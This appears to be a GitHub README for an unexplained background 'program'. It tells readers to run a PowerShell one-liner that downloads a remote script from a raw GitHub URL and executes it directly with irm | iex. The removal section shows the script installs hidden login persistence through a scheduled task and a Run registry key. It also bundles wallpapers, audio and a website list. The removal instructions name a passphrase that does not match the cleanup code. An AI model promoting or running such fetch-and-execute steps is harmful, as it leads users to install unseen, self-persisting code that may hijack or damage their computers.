## Run the program instantly from any computer

No installation or prerequisites are needed. The program runs in the background.

### Setup

Execute the following one-line install command in Microsoft Powershell:

```
irm 'https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1' | iex
```

## Removal

This script creates a helpful system that boots the program on login, this is not dissimilar to many other software solutions. To remove this functionality utilise the following procedure.

1. Open the windows quick run menu by pressing the hotkey **Win + R**
2. Type the passphrase `deflock:` to wipe the software from your computer

If that fails use the commands provided bellow to remove the software manually:
```
$ErrorActionPreference = 'SilentlyContinue'

# 1. Stop any running copy
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" |
    Where-Object { $_.ProcessId -ne $PID -and $_.CommandLine -match 'reminders\.ps1' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
$pidFile = "$env:TEMP\TaskReminder\pid.txt"
if (Test-Path $pidFile) { Stop-Process -Id ([int](Get-Content $pidFile | Select-Object -First 1)) -Force }

# 2. Remove autostart
Unregister-ScheduledTask -TaskName "TaskReminder" -Confirm:$false
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TaskReminder"

# 3. Remove the Win+R phrases (both names, in case you changed it)
foreach ($p in "stopreminders","removereminders") {
    Remove-Item "HKCU:\Software\Classes\$p" -Recurse -Force
}

# 4. Delete cached files and the uninstaller folder
Start-Sleep -Seconds 1
Remove-Item "$env:TEMP\TaskReminder" -Recurse -Force
Remove-Item "$env:LOCALAPPDATA\TaskReminderCtl" -Recurse -Force

# 5. Verify
"Task still exists : " + [bool](Get-ScheduledTask -TaskName "TaskReminder")
"Run key still set : " + [bool](Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TaskReminder")
"Cache folder left : " + (Test-Path "$env:TEMP\TaskReminder")
"Ctl folder left   : " + (Test-Path "$env:LOCALAPPDATA\TaskReminderCtl")
```

## Disclaimer

This program, along with the desktop backgrounds, audio files, and website directory included in the `.ps1` script, while curated by the author of this repository, [Kiyan-7](https://github.com/Kiyan-7), are not the intellectual property of nor copyright/trademark holding state of the author. [Kiyan-7](https://github.com/Kiyan-7) permits for you to do as you wish with the program.

> "We have the watch, and I'll see you in Valhalla"
